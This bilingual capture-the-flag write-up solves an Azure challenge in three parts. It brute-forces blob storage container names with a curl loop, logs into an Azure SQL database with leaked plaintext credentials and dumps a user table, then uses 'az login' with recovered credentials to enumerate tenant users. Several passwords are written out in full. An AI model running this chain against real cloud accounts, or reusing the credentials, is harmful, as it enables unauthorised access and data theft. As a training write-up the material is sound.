# Vol en Côte d'Azure - Write-up

---

## Part 1: Découverte du Storage Account

### Objectif
Bruteforcer les domaines Azure pour trouver le storage account contenant des informations compromettantes.

### Solution

#### Étape 1: Préparation de la wordlist
Nous utilisons la wordlist fournie `election_wordlist.txt` qui contient des mots-clés liés aux élections.

#### Étape 2: Bruteforce des storage accounts Azure
Les storage accounts Azure suivent le pattern: `https://{nom}.blob.core.windows.net/`

Nous testons directement le mot-clé donné dans l'énoncé:

```bash
# Test du storage account avec le mot-clé fourni
curl -s -I "https://monacogovernement.blob.core.windows.net/"
```

#### Étape 3: Découverte du storage account
En testant le mot-clé fourni, nous trouvons le storage account valide:
`https://monacogovernement.blob.core.windows.net/`

#### Étape 4: Bruteforce des containers
L'énumération directe des containers échoue:
```bash
curl "https://monacogovernement.blob.core.windows.net/?comp=list"
# Retourne: ResourceNotFound - les containers ne sont pas listables publiquement
```

Nous devons donc bruteforcer les noms de containers avec la wordlist:

```bash
# Bruteforce des containers avec la wordlist
for word in $(cat election_wordlist.txt); do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://monacogovernement.blob.core.windows.net/${word}/?restype=container&comp=list")
    if [ "$response" != "404" ]; then
        echo "Container trouvé: $word (HTTP $response)"
    fi
done
```

Nous découvrons que le container `elections` existe et est accessible.

#### Étape 5: Énumération des fichiers dans le container
Une fois le container `elections` découvert, nous pouvons lister directement son contenu:

```bash
# Lister les fichiers du container elections
curl "https://monacogovernement.blob.core.windows.net/elections/?restype=container&comp=list"
```

Cette commande nous révèle les fichiers présents dans le container, notamment `elections.txt`.

#### Étape 6: Accès au fichier compromettant
Nous accédons directement au fichier découvert:

```bash
# Récupérer le contenu du fichier
curl "https://monacogovernement.blob.core.windows.net/elections/elections.txt"
```

Le fichier contient (source: [https://monacogovernement.blob.core.windows.net/elections/elections.txt](https://monacogovernement.blob.core.windows.net/elections/elections.txt)):
```
our database credentials for our rigged elections are : monacosql:wElOvECLOUD! flag-st0r4g3-accounts-are-hard
```

**Flag Part 1:** `flag-st0r4g3-accounts-are-hard`

---

## Part 2: Accès à la Base de Données

### Contexte
Avec les credentials de la base de données trouvés dans le storage account, nous devons maintenant accéder à la database pour continuer notre investigation.

### Objectif
Se connecter à la base de données Azure SQL et récupérer les informations stockées.

### Solution

#### Étape 1: Identification de la database
Les bases de données Azure SQL suivent le pattern: `{nom}.database.windows.net`

En suivant le même pattern que le storage account, nous testons:
`monacogovernement.database.windows.net`

```bash
# Test de connectivité à la database
nslookup monacogovernement.database.windows.net
```

#### Étape 2: Connexion à la database
Avec les credentials `monacosql:wElOvECLOUD!` trouvés dans le storage account:

```bash
# Utiliser sqlcmd ou Azure CLI
sqlcmd -S monacogovernement.database.windows.net -U monacosql -P 'wElOvECLOUD!' -d elections
```

Ou avec Azure CLI:
```bash
az sql db show-connection-string --server monacogovernement --name elections
```

#### Étape 3: Énumération des tables
```sql
-- Lister les tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

Nous découvrons la table `dbo.Employes`.

#### Étape 4: Extraction des données sensibles
```sql
-- Explorer le contenu de la table des employés
SELECT * FROM dbo.Employes;
```

Cette table contient les informations des employés du gouvernement, incluant:
- Le flag de cette partie
- Les credentials du secrétaire du roi (nécessaires pour la partie 3)

Résultat typique:
```
Mail                                                Password
flag-databases-should-not-be-accessible-to-everyone NULL
SecretaryOfTheKing@paullorierproton.onmicrosoft.com ViveLeRoi!
```

**Flag Part 2:** `flag-databases-should-not-be-accessible-to-everyone`

**Credentials récupérés pour Part 3:** `SecretaryOfTheKing@paullorierproton.onmicrosoft.com:ViveLeRoi!`

---

## Part 3: Énumération du Tenant Azure

### Contexte
Nous avons maintenant accès à des credentials d'administration trouvés dans les notes. Il faut les utiliser pour énumérer le tenant Azure et trouver des preuves contre le roi.

### Objectif
Utiliser les credentials pour accéder au tenant Azure et trouver le flag final dans le profil du roi.

### Solution

#### Étape 1: Utilisation des credentials trouvés
D'après la table `dbo.Employes` de la base de données, nous avons récupéré:
- `SecretaryOfTheKing@paullorierproton.onmicrosoft.com:ViveLeRoi!`

Note: Il se peut que d'autres entrées dans la table contiennent également les credentials du roi (`KingOfMonaco:Zafa760107123456789!`).

#### Étape 2: Authentification Azure
```bash
# Utiliser Azure CLI
az login --username SecretaryOfTheKing@paullorierproton.onmicrosoft.com --password 'ViveLeRoi!'
```

#### Étape 3: Énumération du tenant
```bash
# Lister les utilisateurs
az ad user list --output table

# Obtenir des informations sur le roi
az ad user show --id KingOfMonaco --output json
```

#### Étape 4: Accès aux informations du roi
En énumérant les propriétés du compte `KingOfMonaco`, nous trouvons des informations personnalisées ou des notes qui contiennent le flag final.

```bash
# Vérifier les propriétés étendues
az ad user show --id KingOfMonaco --query "additionalProperties" --output json
```

#### Étape 5: Récupération du flag final
Dans les métadonnées ou les propriétés du user `KingOfMonaco`, nous trouvons:

**Flag Part 3:** `flag-ohoh-the-king-has-dirty-hands`

---

---

# Flight to Azure Coast - Write-up (English Version)

---

## Part 1: Storage Account Discovery

### Objective
Brute force Azure domains to find the storage account containing compromising information.

### Solution

#### Step 1: Wordlist Preparation
We use the provided wordlist `election_wordlist.txt` which contains election-related keywords.

#### Step 2: Azure Storage Account Brute Force
Azure storage accounts follow the pattern: `https://{name}.blob.core.windows.net/`

We test the keyword provided in the challenge description:

```bash
# Test the storage account with the provided keyword
curl -s -I "https://monacogovernement.blob.core.windows.net/"
```

#### Step 3: Storage Account Discovery
Testing the provided keyword, we find the valid storage account:
`https://monacogovernement.blob.core.windows.net/`

#### Step 4: Container Brute Force
Direct container enumeration fails:
```bash
curl "https://monacogovernement.blob.core.windows.net/?comp=list"
# Returns: ResourceNotFound - containers are not publicly listable
```

We must brute force container names using the wordlist:

```bash
# Brute force containers with the wordlist
for word in $(cat election_wordlist.txt); do
    response=$(curl -s -o /dev/null -w "%{http_code}" "https://monacogovernement.blob.core.windows.net/${word}/?restype=container&comp=list")
    if [ "$response" != "404" ]; then
        echo "Container found: $word (HTTP $response)"
    fi
done
```

We discover that the `elections` container exists and is accessible.

#### Step 5: File Enumeration in Container
Once the `elections` container is discovered, we can directly list its content:

```bash
# List files in the elections container
curl "https://monacogovernement.blob.core.windows.net/elections/?restype=container&comp=list"
```

This command reveals files present in the container, notably `elections.txt`.

#### Step 6: Access to Compromising File
We directly access the discovered file:

```bash
# Retrieve file content
curl "https://monacogovernement.blob.core.windows.net/elections/elections.txt"
```

The file contains (source: [https://monacogovernement.blob.core.windows.net/elections/elections.txt](https://monacogovernement.blob.core.windows.net/elections/elections.txt)):
```
our database credentials for our rigged elections are : monacosql:wElOvECLOUD! flag-st0r4g3-accounts-are-hard
```

**Flag Part 1:** `flag-st0r4g3-accounts-are-hard`

---

## Part 2: Database Access

### Context
With the database credentials found in the storage account, we must now access the database to continue our investigation.

### Objective
Connect to the Azure SQL database and retrieve stored information.

### Solution

#### Step 1: Database Identification
Azure SQL databases follow the pattern: `{name}.database.windows.net`

Following the same pattern as the storage account, we test:
`monacogovernement.database.windows.net`

```bash
# Test database connectivity
nslookup monacogovernement.database.windows.net
```

#### Step 2: Database Connection
With the credentials `monacosql:wElOvECLOUD!` found in the storage account:

```bash
# Use sqlcmd or Azure CLI
sqlcmd -S monacogovernement.database.windows.net -U monacosql -P 'wElOvECLOUD!' -d elections
```

Or with Azure CLI:
```bash
az sql db show-connection-string --server monacogovernement --name elections
```

#### Step 3: Table Enumeration
```sql
-- List tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

We discover the `dbo.Employes` table.

#### Step 4: Sensitive Data Extraction
```sql
-- Explore the employees table content
SELECT * FROM dbo.Employes;
```

This table contains government employee information, including:
- The flag for this part
- The king's secretary credentials (needed for part 3)

Typical result:
```
Mail                                                Password
flag-databases-should-not-be-accessible-to-everyone NULL
SecretaryOfTheKing@paullorierproton.onmicrosoft.com ViveLeRoi!
```

**Flag Part 2:** `flag-databases-should-not-be-accessible-to-everyone`

**Credentials recovered for Part 3:** `SecretaryOfTheKing@paullorierproton.onmicrosoft.com:ViveLeRoi!`

---

## Part 3: Azure Tenant Enumeration

### Context
We now have access to administrative credentials found in the database. We need to use them to enumerate the Azure tenant and find evidence against the king.

### Objective
Use the credentials to access the Azure tenant and find the final flag in the king's profile.

### Solution

#### Step 1: Using Found Credentials
From the `dbo.Employes` table in the database, we recovered:
- `SecretaryOfTheKing@paullorierproton.onmicrosoft.com:ViveLeRoi!`

Note: Other entries in the table may also contain the king's credentials (`KingOfMonaco:Zafa760107123456789!`).

#### Step 2: Azure Authentication
```bash
# Use Azure CLI
az login --username SecretaryOfTheKing@paullorierproton.onmicrosoft.com --password 'ViveLeRoi!'
```

#### Step 3: Tenant Enumeration
```bash
# List users
az ad user list --output table

# Get information about the king
az ad user show --id KingOfMonaco --output json
```

#### Step 4: Access to King's Information
By enumerating the properties of the `KingOfMonaco` account, we find custom information or notes containing the final flag.

```bash
# Check extended properties
az ad user show --id KingOfMonaco --query "additionalProperties" --output json
```

#### Step 5: Final Flag Recovery
In the metadata or properties of the `KingOfMonaco` user, we find:

**Flag Part 3:** `flag-ohoh-the-king-has-dirty-hands`

---